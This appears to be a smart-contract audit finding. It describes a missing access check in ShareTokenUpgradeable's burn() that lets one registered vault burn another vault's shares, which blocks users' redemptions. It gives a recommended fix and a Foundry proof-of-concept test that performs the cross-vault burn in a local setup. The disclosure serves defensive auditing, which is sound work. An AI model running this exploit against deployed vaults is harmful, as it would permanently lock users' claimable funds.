## Title
Cross-Vault Share Burning Allows Any Vault to Destroy Other Vaults' Reserved Redemption Shares

## Summary
The `burn()` function in `ShareTokenUpgradeable.sol` allows any registered vault to burn shares from any address, including other vaults' addresses. This enables a compromised or malicious vault to burn shares that other vaults are holding for users' claimable redemptions, permanently blocking those users from claiming their funds.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ShareTokenUpgradeable.sol` (function `burn`, lines 412-414) [1](#0-0) 

**Intended Logic:** The `burn()` function should allow vaults to burn shares from their own address when processing redemption claims. When users claim redemptions, the vault should call `burn(address(this), shares)` to burn shares from itself. [2](#0-1) 

**Actual Logic:** The `burn()` function only checks that the caller is a registered vault via the `onlyVaults` modifier, but does NOT verify that the `account` parameter equals `msg.sender`. This allows VaultA to call `burn(address(VaultB), amount)` and burn shares from VaultB's balance. [3](#0-2) 

**Exploitation Path:**
1. Users have claimable redemptions in VaultA (shares held by VaultA tracked in `totalClaimableRedeemShares`)
2. VaultB (compromised or malicious) calls `shareToken.burn(address(VaultA), VaultA.shareBalance)`
3. All of VaultA's shares are burned, including shares reserved for users' claimable redemptions
4. VaultA still has accounting records: `claimableRedeemShares[user] > 0` and `claimableRedeemAssets[user] > 0`
5. When users try to claim via `redeem()` or `withdraw()`, VaultA attempts to burn shares from itself but has insufficient balance
6. The burn reverts, making all redemptions permanently unredeemable [4](#0-3) 

**Security Property Broken:** 
- Invariant #11: "No role escalation - access control boundaries enforced" - VaultA can affect VaultB's operations
- Invariant #12: "No fund theft - no double-claims, no reentrancy, no bypass" - Users' claimable funds become permanently locked

## Impact Explanation
- **Affected Assets**: All share tokens held by any vault, representing users' claimable redemptions
- **Damage Severity**: Complete loss of access to claimable redemptions. While the underlying assets remain in the vault contract, users cannot claim them because the shares needed for the burn operation no longer exist
- **User Impact**: All users with claimable redemptions in the targeted vault are affected. Any vault can be targeted, so all users across all vaults are at risk if any single vault is compromised

## Likelihood Explanation
- **Attacker Profile**: Owner/admin of any registered vault, or attacker who compromises a vault through its upgrade mechanism
- **Preconditions**: 
  - Multiple vaults registered to the same ShareToken (intended design for multi-asset system)
  - Target vault has users with claimable redemptions (shares held by vault)
  - Attacker controls at least one registered vault
- **Execution Complexity**: Single transaction: `shareToken.burn(address(targetVault), targetVault.shareBalance)`
- **Frequency**: Can be executed at any time once preconditions are met; effect is permanent and irreversible

## Recommendation

Add a validation check to ensure vaults can only burn shares from their own address:

```solidity
// In src/ShareTokenUpgradeable.sol, function burn, lines 412-414:

// CURRENT (vulnerable):
function burn(address account, uint256 amount) external onlyVaults {
    _burn(account, amount);
}

// FIXED:
function burn(address account, uint256 amount) external onlyVaults {
    // Restrict vaults to only burn shares from themselves
    if (account != msg.sender) revert Unauthorized();
    _burn(account, amount);
}
```

This ensures each vault can only burn shares it owns, preventing cross-vault interference while maintaining the intended functionality for redemption claims.

## Proof of Concept

```solidity
// File: test/Exploit_CrossVaultBurn.t.sol
// Run with: forge test --match-test test_CrossVaultBurn -vvv

pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/ShareTokenUpgradeable.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ERC20Faucet.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit_CrossVaultBurn is Test {
    ShareTokenUpgradeable public shareToken;
    ERC7575VaultUpgradeable public vaultA;
    ERC7575VaultUpgradeable public vaultB;
    ERC20Faucet public assetA;
    ERC20Faucet public assetB;
    
    address public owner = makeAddr("owner");
    address public user = makeAddr("user");
    address public investmentManager = makeAddr("investmentManager");
    
    function setUp() public {
        vm.startPrank(owner);
        
        // Deploy ShareToken
        ShareTokenUpgradeable shareTokenImpl = new ShareTokenUpgradeable();
        bytes memory shareTokenInitData = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector, 
            "Multi-Asset Shares", 
            "MAS", 
            owner
        );
        ERC1967Proxy shareTokenProxy = new ERC1967Proxy(address(shareTokenImpl), shareTokenInitData);
        shareToken = ShareTokenUpgradeable(address(shareTokenProxy));
        
        // Deploy assets
        assetA = new ERC20Faucet("Asset A", "ASTA", 1000000 * 1e18);
        vm.warp(block.timestamp + 1 hours + 1);
        assetB = new ERC20Faucet("Asset B", "ASTB", 1000000 * 1e18);
        
        // Deploy vaults
        vaultA = _deployVault(IERC20(assetA));
        vaultB = _deployVault(IERC20(assetB));
        
        // Register vaults
        shareToken.registerVault(address(assetA), address(vaultA));
        shareToken.registerVault(address(assetB), address(vaultB));
        
        // Set investment managers
        vaultA.setInvestmentManager(investmentManager);
        vaultB.setInvestmentManager(investmentManager);
        
        vm.stopPrank();
        
        // Give user assets
        assetA.faucetAmountFor(user, 10000e18);
    }
    
    function _deployVault(IERC20 asset) internal returns (ERC7575VaultUpgradeable) {
        ERC7575VaultUpgradeable vaultImpl = new ERC7575VaultUpgradeable();
        bytes memory initData = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector, 
            asset, 
            address(shareToken), 
            owner
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(address(vaultImpl), initData);
        return ERC7575VaultUpgradeable(address(vaultProxy));
    }
    
    function test_CrossVaultBurn() public {
        // SETUP: User deposits and gets claimable redemption in VaultA
        vm.startPrank(user);
        assetA.approve(address(vaultA), 1000e18);
        vaultA.requestDeposit(1000e18, user, user);
        vm.stopPrank();
        
        vm.prank(investmentManager);
        vaultA.fulfillDeposit(user, 1000e18);
        
        vm.prank(user);
        uint256 shares = vaultA.deposit(1000e18, user, user);
        
        // User requests redemption
        vm.prank(user);
        vaultA.requestRedeem(shares, user, user);
        
        // Investment manager fulfills redemption
        vm.prank(investmentManager);
        vaultA.fulfillRedeem(user, shares);
        
        // Verify VaultA has shares for claimable redemption
        uint256 vaultAShares = shareToken.balanceOf(address(vaultA));
        assertGt(vaultAShares, 0, "VaultA should hold shares for user's claimable redemption");
        
        // EXPLOIT: VaultB burns all of VaultA's shares
        vm.prank(address(vaultB));
        shareToken.burn(address(vaultA), vaultAShares);
        
        // VERIFY: VaultA has zero shares now
        assertEq(shareToken.balanceOf(address(vaultA)), 0, "VaultA shares burned by VaultB");
        
        // User cannot claim redemption anymore
        vm.startPrank(user);
        vm.expectRevert();
        vaultA.redeem(shares, user, user);
        vm.stopPrank();
    }
}
```

## Notes

The vulnerability stems from the multi-asset vault architecture where multiple vaults share a single ShareToken. While the `onlyVaults` modifier restricts the `burn()` function to registered vaults, it fails to enforce that each vault can only burn its own shares. This creates a cross-vault attack surface where one compromised vault can disrupt all other vaults.

The trust model assumes the ShareToken owner is trusted and carefully registers vaults, but does not account for:
1. Individual vault owners potentially being compromised separately
2. Vault upgrade mechanisms being exploited to inject malicious logic
3. The lack of isolation between vaults sharing the same ShareToken

The fix is simple and maintains backward compatibility: add a single check `if (account != msg.sender) revert Unauthorized();` to ensure vaults can only burn shares from their own address.

### Citations

**File:** src/ShareTokenUpgradeable.sol (L126-131)
```text
    // Modifier to restrict minting/burning to registered vaults
    modifier onlyVaults() {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        if ($.vaultToAsset[msg.sender] == address(0)) revert Unauthorized();
        _;
    }
```

**File:** src/ShareTokenUpgradeable.sol (L412-414)
```text
    function burn(address account, uint256 amount) external onlyVaults {
        _burn(account, amount);
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L885-918)
```text
    function redeem(uint256 shares, address receiver, address controller) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (!(controller == msg.sender || IERC7540($.shareToken).isOperator(controller, msg.sender))) {
            revert InvalidCaller();
        }
        if (shares == 0) revert ZeroShares();

        uint256 availableShares = $.claimableRedeemShares[controller];
        if (shares > availableShares) revert InsufficientClaimableShares();

        // Calculate proportional assets for the requested shares
        uint256 availableAssets = $.claimableRedeemAssets[controller];
        assets = shares.mulDiv(availableAssets, availableShares, Math.Rounding.Floor);

        if (assets == availableAssets) {
            // Remove from active redeem requesters if no more claimable assets and the potential dust
            $.activeRedeemRequesters.remove(controller);
            delete $.claimableRedeemAssets[controller];
            delete $.claimableRedeemShares[controller];
        } else {
            $.claimableRedeemAssets[controller] -= assets;
            $.claimableRedeemShares[controller] -= shares;
        }
        $.totalClaimableRedeemAssets -= assets;
        $.totalClaimableRedeemShares -= shares; // Decrement shares that are being burned

        // Burn the shares as per ERC7540 spec - shares are burned when request is claimed
        ShareTokenUpgradeable($.shareToken).burn(address(this), shares);

        emit Withdraw(msg.sender, receiver, controller, assets, shares);
        if (assets > 0) {
            SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
        }
    }
```
